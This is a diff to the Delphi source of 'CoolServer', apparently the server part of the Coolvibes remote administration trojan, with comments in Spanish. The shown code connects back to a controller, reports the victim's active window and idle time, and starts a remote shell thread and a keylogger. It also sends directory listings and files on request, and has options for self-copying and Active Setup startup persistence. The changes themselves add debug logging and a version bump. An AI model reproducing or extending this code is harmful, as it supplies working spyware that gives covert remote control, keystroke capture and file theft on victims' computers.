@@ -12,6 +12,11 @@
 
      El equipo Coolvibes
 *)
+
+//Config del release
+{$define CommDebug}
+{$define DevConfig}
+
 //library CoolServer; //Para crear el server definitivo que colocaremos en %cooldir%/cliente/recursos/coolserver.dll
 program CoolServer; //Para debug, más lineas "Para debug" abajo
 uses
@@ -43,7 +48,9 @@ uses
   UnitTransfer in 'UnitTransfer.pas',
   UnitVariables in 'UnitVariables.pas',
   UnitWindows in 'UnitWindows.pas',
-  UnitPlugins in 'UnitPlugins.pas';
+  UnitPlugins in 'UnitPlugins.pas';//,
+  //ZLibEx in 'delphizlib/ZLibEx.pas',
+  //ZLibExApi in 'delphizlib/ZLibExApi.pas';
 
 var
   SH: Integer; //SocketHandle de la conexión principal
@@ -64,6 +71,8 @@ const
 procedure sendText(str: AnsiString);
 begin
   sock.SendString(str);
+  //sock.SendString( ZCompressStr(str) );
+  {$ifdef CommDebug}OutputDebugString(PChar('Server OUT: ' + str));{$endif}
 end;
 
 procedure CheckAlive();
@@ -127,7 +136,8 @@ begin
   KeepAliveTimer(25000);
   while (GetMessage(Msg, 0, 0, 0)) do
     begin
-      if ThreadStarted then break; //Se ha iniciado el keylogger, él se encargará de los mensajes
+      if ThreadStarted then
+        break; //Se ha iniciado el keylogger, él se encargará de los mensajes
       TranslateMessage(Msg);
       DispatchMessage(Msg);
     end;
@@ -146,9 +156,9 @@ begin
   while ((buf[0] <> #10) and (buf[0] <> #13) and (s.Connected)) do
     begin
       input := input + buf[0];
+      //input := ZDecompressStr(buf[0]);
       try
         s.ReceiveBuffer(buf, SizeOf(buf));
-
       except
         input := '';
         s.Destroy;
@@ -156,6 +166,7 @@ begin
       end;
     end;
   Result := input;
+  {$ifdef CommDebug}OutputDebugString(PChar('Server IN: ' + input));{$endif}
 end;
 
 procedure Iniciar();
@@ -193,6 +204,7 @@ begin
       sock.Connect(host, port);
       Conectando := False;
       lastCommandTime := GetTickCount;
+
       while sock.Connected do
         begin
           Recibido := Trim(leer(sock)); //Asignamos la información recibida del Cliente al string Recibido
@@ -201,9 +213,10 @@ begin
 
           if Recibido = 'PING' then //Si recibimos 'PING' del Cliente entonces
             begin
-              Respuesta :=
-                GetActiveWindowCaption() + '|' +
-                GetIdleTime() + '|' + GetUptime() + '|'; //Enviamos información para que actualice el ListViewConexiones
+              //Enviamos información para que actualice el ListViewConexiones
+              Respuesta := GetActiveWindowCaption() + '|' +
+                            GetIdleTime() + '|' +
+                            GetUptime() + '|'; 
               //SendText envía la información al Cliente
               //  SendText(String)
               SendText('PONG|' + Respuesta + ENTER); //Enviamos 'PONG' al Cliente para que se entere
@@ -931,7 +944,7 @@ begin
               Tempstr := '';
               Tempstr := ArchivosDentroDeDirectorio(Recibido);
               if (sock.Connected) then //si se le da a un directorio con muchos subdirectorios puede tardar mucho tiempo...
-                sock.SendString('GETFOLDER' + TempStr + ENTER); //Puede tardar bastante
+                sendText('GETFOLDER' + TempStr + ENTER); //Puede tardar bastante
             end;
 
           if Pos('GETFILE|', Recibido) = 1 then
@@ -1001,7 +1014,7 @@ begin
                   if ShellThreadID = 0 then
                     begin
                       CreateThread(nil, 0, @ShellThread, @ShellParameters, 0, ShellThreadID);
-                      sock.SendString('SHELL|ACTIVAR' + ENTER);
+                      sendText('SHELL|ACTIVAR' + ENTER);
                     end;
                 end
               else if Recibido = 'DESACTIVAR' then
@@ -1370,7 +1383,7 @@ begin
   Configuracion := TSettings(P^); //Leemos la configuración que nos han mandado
   if not Configuracion.bCopiarArchivo then
     Configuracion.sCopyTo := extractfilepath(paramstr(0));
-  VersionDelServer := '1.12';
+  VersionDelServer := '1.13';
   BeginThread(nil, 0, Addr(KeepAliveThread), nil, 0, id1);
   OnServerInitKeylogger(); //Función que inicia el keylogger en caso de que se haya iniciado antes desde el cliente o en el futuro si la configuración lo marca
   CargarPluginsDeInicio();
@@ -1385,6 +1398,8 @@ exports CargarServidor;
 
 begin
   //Para debug:
+  {$ifdef DevConfig}
+  OutputDebugString(PChar('CV Server Ready!'));
   Configuracion.sHosts                 := 'localhost:77¬';
   Configuracion.sID                     := 'Coolserver';
   Configuracion.bCopiarArchivo          := False; //Me copio o no?
@@ -1397,6 +1412,7 @@ begin
   Configuracion.bArranqueActiveSetup    := False;
   Configuracion.sActiveSetupKeyName     := 'blah-blah-blah-blah';
   CargarServidor(@configuracion);
+  {$endif}
   //Fin de Para debug
 end.
 
